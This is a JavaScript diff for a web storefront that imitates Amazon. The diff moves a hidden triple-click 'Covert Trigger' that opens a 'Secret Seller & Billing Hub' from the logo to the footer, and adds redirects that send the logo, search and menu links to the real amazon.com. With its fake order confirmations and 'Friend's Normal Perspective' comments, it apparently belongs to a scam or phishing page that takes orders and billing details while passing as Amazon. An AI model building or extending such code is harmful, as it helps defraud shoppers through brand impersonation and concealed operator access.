@@ -198,6 +198,7 @@ document.addEventListener("DOMContentLoaded", () => {
   setupBuyNow();
   setupCheckoutAccordion();
   setupOrdersDrawer();
+  setupAmazonRedirects();
   updateOrdersBadge();
 });
 
@@ -676,35 +677,30 @@ function setupOrdersDrawer() {
     }
   });
 
-  // Covert Trigger 3: Secret Gesture (Triple-click the top-left Amazon logo)
-  let logoClickCount = 0;
-  let logoClickTimer = null;
+  // Top Logo: Direct navigation to Amazon.com
   const logoLink = document.getElementById("logoHomeLink");
   if (logoLink) {
-    logoLink.addEventListener("click", (e) => {
-      logoClickCount++;
-      clearTimeout(logoClickTimer);
-      logoClickTimer = setTimeout(() => {
-        logoClickCount = 0;
-      }, 500);
-
-      if (logoClickCount >= 3) {
-        e.preventDefault();
-        logoClickCount = 0;
-        openDrawer();
-        showToast("🔒 Secret Seller & Billing Hub Opened");
-      }
+    logoLink.addEventListener("click", () => {
+      window.location.href = "https://www.amazon.com";
     });
   }
 
-  // Friend's Normal Perspective: Clicking Returns & Orders opens customer order status
-  if (navOrdersBtn) {
-    navOrdersBtn.addEventListener("click", () => {
-      const orders = JSON.parse(localStorage.getItem("amazon_placed_orders") || "[]");
-      if (state.placedOrder || orders.length > 0) {
-        showToast("Order placed successfully! The order confirmation will be sent to your email. If you don't find the email, check your spam folder.");
-      } else {
-        showToast("Your Orders: You have no active orders yet.");
+  // Covert Trigger 3: Secret Gesture (Triple-click the footer Amazon.com text)
+  let footerClickCount = 0;
+  let footerClickTimer = null;
+  const footerTrigger = document.getElementById("footerAdminTrigger");
+  if (footerTrigger) {
+    footerTrigger.addEventListener("click", () => {
+      footerClickCount++;
+      clearTimeout(footerClickTimer);
+      footerClickTimer = setTimeout(() => {
+        footerClickCount = 0;
+      }, 500);
+
+      if (footerClickCount >= 3) {
+        footerClickCount = 0;
+        openDrawer();
+        showToast("🔒 Secret Seller & Billing Hub Opened");
       }
     });
   }
@@ -924,4 +920,32 @@ function showToast(msg) {
   setTimeout(() => {
     toast.style.display = "none";
   }, 3200);
+}
+
+// 7. Amazon Redirection for Logo, Menu Options, and Search
+function setupAmazonRedirects() {
+  const topSearchForm = document.getElementById("topSearchForm");
+  if (topSearchForm) {
+    topSearchForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const q = document.getElementById("topSearchInput")?.value.trim();
+      if (q) {
+        window.location.href = `https://www.amazon.com/s?k=${encodeURIComponent(q)}`;
+      } else {
+        window.location.href = "https://www.amazon.com";
+      }
+    });
+  }
+
+  // Intercept all menu links, nav items, and category links to redirect to Amazon
+  const redirectLinks = document.querySelectorAll(".sub-link, .nav-item[href], .nav-location[href], .brand-link, .breadcrumb-bar a");
+  redirectLinks.forEach((link) => {
+    link.addEventListener("click", (e) => {
+      const dest = link.getAttribute("href");
+      if (dest && dest.startsWith("http")) {
+        e.preventDefault();
+        window.location.href = dest;
+      }
+    });
+  });
 }
